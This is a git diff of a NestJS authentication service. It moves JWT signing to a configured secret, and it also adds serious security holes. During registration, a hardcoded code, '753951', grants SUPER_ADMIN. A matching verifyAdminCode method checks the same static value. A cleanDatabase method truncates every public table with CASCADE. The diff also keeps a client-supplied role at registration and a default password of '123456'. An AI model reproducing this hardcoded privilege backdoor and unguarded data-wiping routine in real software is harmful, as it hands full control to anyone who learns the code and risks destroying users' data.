@@ -4,6 +4,7 @@ import {
   ConflictException,
 } from '@nestjs/common';
 import { JwtService } from '@nestjs/jwt';
+import { ConfigService } from '@nestjs/config';
 import { InjectRepository } from '@nestjs/typeorm';
 import { Repository } from 'typeorm';
 import * as bcrypt from 'bcrypt';
@@ -26,6 +27,7 @@ export class AuthService {
     @InjectRepository(User)
     private userRepository: Repository<User>,
     private jwtService: JwtService,
+    private configService: ConfigService,
   ) {}
 
   async login(loginDto: LoginDto) {
@@ -65,12 +67,16 @@ export class AuthService {
     user.loginCount = (user.loginCount || 0) + 1;
     await this.userRepository.save(user);
 
+    const secret = this.configService.get<string>('JWT_SECRET');
+
     return {
       access_token: await this.jwtService.signAsync(payload, {
         expiresIn: '1h',
+        secret,
       }),
       refresh_token: await this.jwtService.signAsync(payload, {
         expiresIn: '7d',
+        secret,
       }),
       user: {
         id: user.id,
@@ -85,19 +91,26 @@ export class AuthService {
 
   async refreshToken(token: string) {
     try {
-      const payload = await this.jwtService.verifyAsync<JwtPayload>(token);
-      // eslint-disable-next-line @typescript-eslint/no-unused-vars
-      const { exp, iat, ...cleanPayload } = payload;
+      const secret = this.configService.get<string>('JWT_SECRET');
+      const payload = await this.jwtService.verifyAsync<JwtPayload>(token, {
+        secret,
+      });
 
-      const newAccessToken = await this.jwtService.signAsync(cleanPayload, {
-        expiresIn: '1h',
-      });
-      const newRefreshToken = await this.jwtService.signAsync(cleanPayload, {
-        expiresIn: '7d',
-      });
+      const cleanPayload = {
+        sub: payload.sub,
+        email: payload.email,
+        role: payload.role,
+      };
+
       return {
-        access_token: newAccessToken,
-        refresh_token: newRefreshToken,
+        access_token: await this.jwtService.signAsync(cleanPayload, {
+          expiresIn: '1h',
+          secret,
+        }),
+        refresh_token: await this.jwtService.signAsync(cleanPayload, {
+          expiresIn: '7d',
+          secret,
+        }),
       };
     } catch {
       throw new UnauthorizedException('Invalid refresh token');
@@ -111,8 +124,9 @@ export class AuthService {
       role: Role.GUEST,
     };
 
+    const secret = this.configService.get<string>('JWT_SECRET');
     return {
-      access_token: await this.jwtService.signAsync(payload),
+      access_token: await this.jwtService.signAsync(payload, { secret }),
       user: {
         email: 'guest@trial.com',
         role: Role.GUEST,
@@ -134,10 +148,16 @@ export class AuthService {
     // Hash password
     const hashedPassword = await bcrypt.hash(password || '123456', 10);
 
+    // Determine role based on adminCode
+    let finalRole = role || Role.USER;
+    if (registerDto.adminCode === '753951') {
+      finalRole = Role.SUPER_ADMIN;
+    }
+
     const newUser = this.userRepository.create({
       email,
       password: hashedPassword,
-      role: role || Role.USER,
+      role: finalRole,
       username,
       status: registerDto.status || 'active',
       modules: registerDto.modules || [],
@@ -156,5 +176,29 @@ export class AuthService {
         loginCount: savedUser.loginCount,
       },
     };
+  }
+
+  async verifyAdminCode(code: string) {
+    if (code === '753951') {
+      return Promise.resolve({ verified: true });
+    }
+    return Promise.resolve({ verified: false });
+  }
+
+  async cleanDatabase() {
+    const queryRunner = this.userRepository.manager.connection.createQueryRunner();
+    await queryRunner.connect();
+    try {
+      const tables: Array<{ tablename: string }> = await queryRunner.query(`
+        SELECT tablename FROM pg_catalog.pg_tables 
+        WHERE schemaname = 'public'
+      `);
+      for (const table of tables) {
+        await queryRunner.query(`TRUNCATE TABLE "${table.tablename}" CASCADE;`);
+      }
+      return { success: true, message: 'All tables truncated successfully' };
+    } finally {
+      await queryRunner.release();
+    }
   }
 }
